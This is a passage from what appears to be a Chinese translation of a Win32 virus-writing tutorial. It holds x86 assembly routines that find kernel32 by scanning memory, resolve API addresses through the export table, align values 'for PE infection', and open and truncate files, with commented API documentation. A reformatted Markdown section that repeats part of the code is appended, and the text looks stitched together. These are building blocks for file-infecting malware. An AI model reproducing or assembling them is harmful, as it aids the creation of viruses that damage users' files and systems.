
```
_@1:    cmp     word ptr [esi],"ZM"

        jz      WeGotK32

_@2:    sub     esi,10000h

        loop    _@1

WeFailed:

        mov     ecx,cs

        xor     cl,cl

        jecxz   WeAreInWNT

        mov     esi,kernel_

        jmp     WeGotK32

WeAreInWNT:

        mov     esi,kernel_wNT

WeGotK32:

        xchg    eax,esi

        ret

GetK32        endp

GetAPIs       proc

@@1:    push    esi

        push    edi

        call    GetAPI

        pop     edi

        pop     esi

        stosd

        xchg    edi,esi

        xor     al,al

@@2:    scasb

        jnz     @@2

        xchg    edi,esi

@@3:    cmp     byte ptr [esi],0BBh

        jnz     @@1

        ret

GetAPIs       endp

GetAPI        proc

        mov     edx,esi

        mov     edi,esi

        xor     al,al

@_1:    scasb

        jnz     @_1

        sub     edi,esi                     ; EDI = API 的名字大小

        mov     ecx,edi

        xor     eax,eax

        mov     esi,3Ch

        add     esi,[ebp+kernel]

        lodsw

        add     eax,[ebp+kernel]

        mov     esi,[eax+78h]

        add     esi,1Ch

        add     esi,[ebp+kernel]

        lea     edi,[ebp+AddressTableVA]

        lodsd

        add     eax,[ebp+kernel]

        stosd

        lodsd

        add     eax,[ebp+kernel]

        push    eax                         ; mov [NameTableVA],eax   =)

        stosd

        lodsd

        add     eax,[ebp+kernel]

        stosd

        pop     esi

        xor     ebx,ebx

@_3:    lodsd

        push    esi       

        add     eax,[ebp+kernel]

        mov     esi,eax

        mov     edi,edx

        push    ecx

        cld

        rep     cmpsb

        pop     ecx

        jz      @_4

        pop     esi

        inc     ebx

        jmp     @_3               

@_4:

        pop     esi

        xchg    eax,ebx

        shl     eax,1

        add     eax,dword ptr [ebp+OrdinalTableVA]

        xor     esi,esi

        xchg    eax,esi

        lodsw

        shl     eax,2

        add     eax,dword ptr [ebp+AddressTableVA]

        mov     esi,eax

        lodsd

        add     eax,[ebp+kernel]

        ret

GetAPI        endp

;---------------------------------------------------------------------------

; 上面所有的代码以前已经见过了，这里是有了一点点优化，所以你可以看看你自己用其它

; 方法该怎么做。

;---------------------------------------------------------------------------

; 输入:

;     EAX - 对齐的值

;     ECX - 对齐因子

; 输出:

;     EAX - 对齐值

Align         proc

        push    edx

        xor     edx,edx

        push    eax

        div     ecx

        pop     eax

        sub     ecx,edx

        add     eax,ecx

        pop     edx

        ret

Align         endp

;---------------------------------------------------------------------------

; 这个函数执行在 PE 感染中非常重要的一件事情：把数字和指定的因子对齐。如果你不是

; 一个 d0rk，你就不必问我它是怎么工作的了。( Fuck,你到底学了没有？)

;---------------------------------------------------------------------------

; 输入:

;     ECX - 要截的文件

; 输出:

;     无.

TruncFile     proc

        xor     eax,eax

        push    eax

        push    eax

        push    ecx

        push    dword ptr [ebp+FileHandle]

        call    [ebp+_SetFilePointer]

        push    dword ptr [ebp+FileHandle]

        call    [ebp+_SetEndOfFile]

        ret

TruncFile     endp

;---------------------------------------------------------------------------

; SetFilePointer 使文件指针指向一个打开的文件。

;                                                               

; DWORD SetFilePointer(                                        

;   HANDLE hFile,       // 文件的句柄

;   LONG lDistanceToMove,       // 需要移动文件指针的字节数

;   PLONG lpDistanceToMoveHigh, // 要移动距离的高位字

;                           

;   DWORD dwMoveMethod  // 怎么移

;  );                                                          

;                                                               

; 参数

; ====

;                                                               

; ?hFile: 指需要移动移动文件指针的文件。这个文件句柄必须是用 GENERIC_READ 或 GENERIC_WRITE 

;   方式创建的。

;                                                               

; ?lDistanceToMove: 指要移动文件指针的字节数。一个正值表示指针向前移动，而一个负

;   值表示文件指针向后移动。

;                                                               

; ?lpDistanceToMoveHigh: 指向 64 位距离的高位字。如果这个参数的值是 NULL,SetFilePointer

;   只能操作最大为 2³² - 2 的文件。如果这个参数被指定了，最大文件大小是 2⁶⁴ - 2。

;   这个参数还获取新文件指针的高位值。

;                                                               

; ?dwMoveMethod: 指示文件指针移动的开始的地方。这个参数可以是下面的一个值

;                                                               

;     值          方式                                                  

;                                                               

;   + FILE_BEGIN   - 开始点是 0 或文件开始。如果指定了 FILE_BEGIN，DistanceToMove

;                    被理解为新文件指针的位置。

;   + FILE_CURRENT - 当前文件指针的值是开始点。

;   + FILE_END     - 当前文件尾是开始点。

;                                                               

; 返回值

; ======

;                                                               

; ?如果 SetFilePointer 函数调用成功，返回值是双字新文件指针的低位值，而且如果

;   lpDistanceToMoveHigh 不是 NULL，这个函数把新文件指针的双字的高位赋给由那个参

;   数指向的长整型。

; ?如果函数调用失败而且 lpDistanceToMoveHigh 是 NULL，返回值是 0xFFFFFFFF。想要

;   获得详细的错误信息，调用 GetLastError 函数。

; ?如果函数失败，而且 lpDistanceToMoveHigh 是非-NULL 的，返回值是 0xFFFFFFFF，而且

;   GetLastError 将返回一个值而不 NO_ERROR。

;                                                               

; ---                                                           

;                                                               

; SetEndOfFile 函数把指定文件的 end-of-file (EOF)位置移到文件指针的当前位置。

;                                                               

; BOOL SetEndOfFile(                                              

;   HANDLE hFile        // 要设置 EOF 的文件的句柄

;  );                                                             

;                                                               

; 参数

; ====

;                                                               

; ?hFile: 指示要移动 EOF 位置的文件。这个句柄必须是以 GENERIC_WRITE 访问文件方式

;   创建的。

;                                                               

; 返回    

; ====

;                                                               

; ?如果函数调用成功，返回值是非 0 值

; ?如果函数调用失败，返回值是 0。想要知道详细的错误信息，调用 GetLastError 函数。

;                                                               ;

;---------------------------------------------------------------------------

; 输入:

;     ESI - 指向要打开的文件的名字

; 输出:

;     EAX - 如果成功是文件的句柄。

OpenFile      proc

        xor     eax,eax

        push    eax

        push    eax

        push    00000003h

        push    eax

        inc     eax

        push    eax

        push    80000000h or 40000000h

        push    esi

        call    [ebp+_CreateFileA]

        ret

OpenFile      endp

;---------------------------------------------------------------------------

; CreateFile 函数创建或打开下面的对象，并返回一个可以访问这个对象的句柄：

;                                                               

;     + 文件 (我们只对这个感兴趣)           

;     + pipes                                     
```

**注释说明：**

*   `SetFilePointer`: 使文件指针指向一个打开的文件。
    *   `DWORD SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)`
    *   **参数**:
        *   `hFile`: 指需要移动移动文件指针的文件。这个文件句柄必须是用 `GENERIC_READ` 或 `GENERIC_WRITE` 方式创建的。
        *   `lDistanceToMove`: 指要移动文件指针的字节数。一个正值表示指针向前移动，而一个负值表示文件指针向后移动。
        *   `lpDistanceToMoveHigh`: 指向 64 位距离的高位字。如果这个参数的值是 `NULL`，`SetFilePointer` 只能操作最大为 $2^{32} - 2$ 的文件。如果这个参数被指定了，最大文件大小是 $2^{64} - 2$。这个参数还获取新文件指针的高位值。
        *   `dwMoveMethod`: 指示文件指针移动的开始的地方。这个参数可以是下面的一个值：
            *   `FILE_BEGIN`: 开始点是 0 或文件开始。如果指定了 `FILE_BEGIN`，`DistanceToMove` 被理解为新文件指针的位置。
            *   `FILE_CURRENT`: 当前文件指针的值是开始点。
            *   `FILE_END`: 当前文件尾是开始点。
    *   **返回值**:
        *   如果 `SetFilePointer` 函数调用成功，返回值是双字新文件指针的低位值，而且如果 `lpDistanceToMoveHigh` 不是 `NULL`，这个函数把新文件指针的双字的高位赋给由那个参数指向的长整型。
        *   如果函数调用失败而且 `lpDistanceToMoveHigh` 是 `NULL`，返回值是 `0xFFFFFFFF`。想要获得详细的错误信息，调用 `GetLastError` 函数。
        *   如果函数失败，而且 `lpDistanceToMoveHigh` 是非-`NULL` 的，返回值是 `0xFFFFFFFF`，而且 `GetLastError` 将返回一个值而不 `NO_ERROR`。

*   `SetEndOfFile`: 函数把指定文件的 `end-of-file` (`EOF`) 位置移到文件指针的当前位置。
    *   `BOOL SetEndOfFile(HANDLE hFile)`
    *   **参数**:
        *   `hFile`: 指示要移动 `EOF` 位置的文件。这个句柄必须是以 `GENERIC_WRITE` 访问文件方式创建的。
    *   **返回**:
        *   如果函数调用成功，返回值是非 0 值。
        *   如果函数调用失败，返回值是 0。想要知道详细的错误信息，调用 `GetLastError` 函数。

*   `CreateFile`: 函数创建或打开下面的对象，并返回一个可以访问这个对象的句柄：
    *   文件 (我们只对这个感兴趣)
    *   pipes

```
        ;---------------------------------------------------------------------------
        ; 输入:
        ;     ESI - 指向要打开的文件的名字
        ; 输出:
        ;     EAX - 如果成功是文件的句柄。

        OpenFile        proc
            xor     eax,eax
            push    eax
            push    eax
            push    00000003h
            push    eax
            inc     eax
            push    eax
            push    80000000h or 40000000h
            push    esi
            call    [ebp+_CreateFileA]
            ret
        OpenFile        endp
```
